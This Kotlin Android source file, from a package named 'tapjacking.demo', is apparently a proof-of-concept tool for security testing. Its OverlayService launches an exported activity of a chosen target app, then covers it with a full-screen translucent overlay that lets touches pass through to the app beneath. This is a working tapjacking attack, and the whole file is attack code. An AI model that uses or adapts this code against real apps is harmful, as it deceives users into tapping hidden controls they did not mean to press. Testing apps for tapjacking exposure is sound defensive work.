package com.tapjacking.demo


import android.app.Service
import android.content.Intent
import android.graphics.PixelFormat
import android.os.Handler
import android.os.IBinder
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.os.Build
import android.util.Log
import android.widget.Toast

class OverlayService : Service() {

    private lateinit var windowManager: WindowManager
    private lateinit var overlayView: View
    private lateinit var targetPackageName: String
    private lateinit var targetExportedActivity: String

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent != null) {
            targetPackageName = intent.getStringExtra("targetPackageName").toString()
            targetExportedActivity = intent.getStringExtra("targetExportedActivity").toString()

            if (!targetPackageName.equals("null") && !targetExportedActivity.equals("null")) {
                try {
                    // 1. Launch the external activity
                    val externalIntent = Intent()
                    externalIntent.setClassName(targetPackageName, targetExportedActivity)
                    externalIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) // Required since we're starting the activity from a service
                    startActivity(externalIntent)

                    // 2. Delay the presentation of the tapjacking view to give time for the activity to launch
                    Handler().postDelayed({
                        setupTapjackingView()
                    }, 1000) // 1 second delay. Adjust as needed.
                } catch (e: Exception) {
                    Toast.makeText(this, "Error: Make sure Target package name is correct and activity is exported", Toast.LENGTH_LONG).show()
                    Log.d("EX", e.toString())
                }
            }
        }
        return super.onStartCommand(intent, flags, startId)
    }

    private fun setupTapjackingView() {
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
        overlayView = LayoutInflater.from(this).inflate(R.layout.overlay_layout, null)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                WindowManager.LayoutParams.TYPE_PHONE
            },
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
            PixelFormat.TRANSLUCENT
        )

        params.gravity = Gravity.TOP or Gravity.LEFT
        windowManager.addView(overlayView, params)

        // Sample button to show the overlay is working, can be replaced or removed
        val btn = overlayView.findViewById<Button>(R.id.sampleButton)
        btn.setOnClickListener { stopSelf() }
    }

    override fun onDestroy() {
        super.onDestroy()
        windowManager.removeView(overlayView)
    }
}